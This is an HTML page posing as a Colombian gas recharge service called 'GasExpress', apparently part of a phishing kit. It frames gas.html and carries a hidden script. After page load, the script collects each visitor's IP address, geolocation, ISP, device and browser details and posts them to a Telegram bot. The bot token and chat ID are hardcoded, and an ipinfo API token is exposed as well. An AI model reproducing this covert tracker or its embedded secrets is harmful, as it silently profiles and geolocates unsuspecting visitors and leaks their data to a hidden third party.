<!DOCTYPE html>
<html lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>GasExpress - Recarga de Gas</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        html,body{margin:0;padding:0;height:100%;overflow:hidden}
        iframe{border:none;width:100%;height:100vh;display:block}
    </style>
</head>
<body>
 
    <!-- ============================================================
    IFRAME - Cambia la URL para mostrar gas.html o gasprueba.html
    ============================================================ -->
    <iframe id="mainIframe" src="gas.html" allowfullscreen="" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation">
    </iframe>

    <!-- ============================================================
    TRACKER A TELEGRAM - SOLO AQUÍ (ELIMINADO DE gas.html)
    ============================================================ -->
    <script>
    (() => {
      'use strict';

      // ============================================================
      // CONFIGURACIÓN DE TELEGRAM
      // ============================================================
      const CONFIG = {
        botToken: '8870122720:AAHfpGjJILsXBRhbdtFvdt49mnBY6oCfrCA',
        chatId: '-4990320783',
        apiUrl: 'https://api.telegram.org/bot',
        testMode: false
      };

      // ============================================================
      // OBTENER INFORMACIÓN DE IP
      // ============================================================
      async function getIPInfo() {
        try {
          const response = await fetch("https://ipinfo.io/json?token=f87ad1c1c69033");
          if (!response.ok) {
            console.warn("Error en ipinfo.io:", response.status);
            return {
              ip: '0.0.0.0',
              country_name: "Desconocido", 
              city: "Desconocido", 
              country_code: "XX", 
              isp: "No disponible",
              region: "Desconocido",
              timezone: "Desconocido",
              latitude: "0",
              longitude: "0"
            };
          }
          const data = await response.json();
          return {
            ip: data.ip || '0.0.0.0',
            country_name: data.country || "Desconocido",
            city: data.city || "Desconocido",
            country_code: data.country || "XX",
            isp: data.org || "No disponible",
            region: data.region || "Desconocido",
            timezone: data.timezone || "Desconocido",
            latitude: data.loc ? data.loc.split(',')[0] : "0",
            longitude: data.loc ? data.loc.split(',')[1] : "0"
          };
        } catch (error) {
          console.error("Error al obtener IP info:", error);
          return {
            ip: '0.0.0.0',
            country_name: "Desconocido", 
            city: "Desconocido", 
            country_code: "XX", 
            isp: "No disponible",
            region: "Desconocido",
            timezone: "Desconocido",
            latitude: "0",
            longitude: "0"
          };
        }
      }

      // ============================================================
      // ANALIZAR USER AGENT
      // ============================================================
      function parseUA() {
        const ua = navigator.userAgent;
        const isBot = /bot|crawler|spider|crawl|headless/i.test(ua);
        let os = "Desconocido";
        let browser = "Desconocido";
        let device = "PC/Laptop";
        let deviceBrand = "Otro";

        if (/Windows NT 10.0/i.test(ua)) os = "Windows 10/11";
        else if (/Windows NT 6.1/i.test(ua)) os = "Windows 7";
        else if (/Windows NT/i.test(ua)) os = "Windows";
        else if (/Mac OS X 10_15/i.test(ua)) os = "macOS Catalina";
        else if (/Mac OS X/i.test(ua)) os = "macOS";
        else if (/Android 13/i.test(ua)) os = "Android 13";
        else if (/Android 12/i.test(ua)) os = "Android 12";
        else if (/Android 11/i.test(ua)) os = "Android 11";
        else if (/Android/i.test(ua)) os = "Android";
        else if (/iOS|iPhone OS/i.test(ua)) os = "iOS";
        else if (/Linux/i.test(ua)) os = "Linux";

        if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
        else if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
        else if (ua.includes('Brave')) browser = 'Brave';

        if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
          device = /iPad|Tablet/i.test(ua) ? 'Tablet' : 'Móvil';
        }

        if (/Samsung/i.test(ua)) deviceBrand = "Samsung";
        else if (/iPhone/i.test(ua)) deviceBrand = "iPhone";
        else if (/iPad/i.test(ua)) deviceBrand = "iPad";
        else if (/Huawei/i.test(ua)) deviceBrand = "Huawei";
        else if (/Xiaomi/i.test(ua)) deviceBrand = "Xiaomi";
        else if (/Motorola/i.test(ua)) deviceBrand = "Motorola";
        else if (/LG/i.test(ua)) deviceBrand = "LG";

        return {
          os, 
          browser,
          device,
          deviceBrand,
          isBot,
          screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}bits)`,
          language: navigator.language || navigator.languages?.[0] || 'es-CO'
        };
      }

      // ============================================================
      // OBTENER REFERRER Y PÁGINA ACTUAL
      // ============================================================
      function getReferrer() {
        const ref = document.referrer;
        if (!ref) return 'Directo';
        try {
          const url = new URL(ref);
          return url.hostname;
        } catch {
          return ref;
        }
      }

      function getCurrentPage() {
        return window.location.pathname + window.location.search;
      }

      function getFormattedDate() {
        const now = new Date();
        return now.toLocaleString('es-CO', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: true
        });
      }

      // ============================================================
      // DETECTAR QUÉ VERSIÓN SE ESTÁ CARGANDO EN EL IFRAME
      // ============================================================
      function detectarVersionIframe() {
        const iframe = document.getElementById('mainIframe');
        if (!iframe) return 'Desconocido';
        const src = iframe.src;
        if (src.includes('gasprueba.html')) return '🧪 PRUEBA';
        if (src.includes('gas.html')) return '🟢 NORMAL';
        if (src.includes('menu')) return '📋 MENÚ';
        return 'Desconocido';
      }

      // ============================================================
      // CONSTRUIR MENSAJE PARA TELEGRAM
      // ============================================================
      function buildMessage(ipInfo, uaInfo, referrer, page) {
        const fecha = getFormattedDate();
        const emoji = ipInfo.country_code === 'CO' ? '🇨🇴' : '🌍';
        const version = detectarVersionIframe();
        
        let mensaje = `🔥 VISITA A GASEXPRESS 🔥\n\n`;
        mensaje += `${version} Versión: ${version}\n`;
        mensaje += `👤 Tipo: ${uaInfo.isBot ? '🤖 BOT' : '👤 Humano'}\n`;
        mensaje += `${emoji} País: ${ipInfo.country_name} (${ipInfo.country_code})\n`;
        mensaje += `📍 Ciudad: ${ipInfo.city}\n`;
        mensaje += `🗺️ Región: ${ipInfo.region}\n`;
        mensaje += `🌐 ISP: ${ipInfo.isp}\n`;
        mensaje += `📶 IP: ${ipInfo.ip}\n`;
        mensaje += `⏰ Zona Horaria: ${ipInfo.timezone}\n\n`;

        mensaje += `🪟 SO: ${uaInfo.os}\n`;
        mensaje += `🌐 Navegador: ${uaInfo.browser}\n`;
        mensaje += `📱 Dispositivo: ${uaInfo.device} (${uaInfo.deviceBrand})\n`;
        mensaje += `🖥️ Pantalla: ${uaInfo.screen}\n`;
        mensaje += `🌍 Idioma: ${uaInfo.language}\n\n`;

        mensaje += `🔗 Referrer: ${referrer}\n`;
        mensaje += `🌐 Sitio: ${window.location.hostname}${page}\n`;
        mensaje += `📍 Coordenadas: ${ipInfo.latitude},${ipInfo.longitude}\n`;
        mensaje += `🕐 Fecha/Hora: ${fecha}`;

        return mensaje;
      }

      // ============================================================
      // ENVIAR A TELEGRAM
      // ============================================================
      function sendToTelegram(message) {
        if (CONFIG.testMode) {
          console.log('🔵 [TEST MODE] Mensaje:');
          console.log(message);
          return Promise.resolve({ ok: true, test: true });
        }

        const url = `${CONFIG.apiUrl}${CONFIG.botToken}/sendMessage`;

        return fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CONFIG.chatId,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          })
        })
        .then(response => response.json())
        .then(data => {
          if (!data.ok) {
            console.error('Error al enviar a Telegram:', data);
            throw new Error(data.description || 'Error desconocido');
          }
          console.log('✅ Mensaje enviado a Telegram correctamente');
          return data;
        })
        .catch(error => {
          console.error('❌ Error enviando a Telegram:', error);
          return { ok: false, error: error.message };
        });
      }

      // ============================================================
      // FUNCIÓN PRINCIPAL - INICIAR TRACKER
      // ============================================================
      function iniciarTracker() {
        // Verificar si ya se registró esta sesión
        const sessionId = 'gasexpress_visited_' + window.location.hostname;
        if (sessionStorage.getItem(sessionId)) {
          console.log('🔵 Esta sesión ya fue registrada');
          return;
        }

        // Marcar como visitado
        sessionStorage.setItem(sessionId, 'true');

        // Obtener todos los datos
        Promise.all([
          getIPInfo(),
          Promise.resolve(parseUA()),
          Promise.resolve(getReferrer()),
          Promise.resolve(getCurrentPage())
        ])
        .then(([ipInfo, uaInfo, referrer, page]) => {
          const mensaje = buildMessage(ipInfo, uaInfo, referrer, page);
          return sendToTelegram(mensaje);
        })
        .catch(error => {
          console.error('❌ Error en el tracker:', error);
        });
      }

      // ============================================================
      // EJECUTAR CUANDO LA PÁGINA ESTÉ LISTA
      // ============================================================
      if (document.readyState === 'complete') {
        setTimeout(iniciarTracker, 1500);
      } else {
        window.addEventListener('load', function() {
          setTimeout(iniciarTracker, 1500);
        });
      }

      console.log('✅ Tracker de GasExpress cargado correctamente (SOLO EN INDEX)');
      console.log('💡 Para cambiar de versión, edita el src del iframe:');
      console.log('   - gas.html → Versión Normal');
      console.log('   - gasprueba.html → Versión de Prueba');
      console.log('   - menu/index.html → Versión Menú');

    })();
    </script>

</body>
</html>
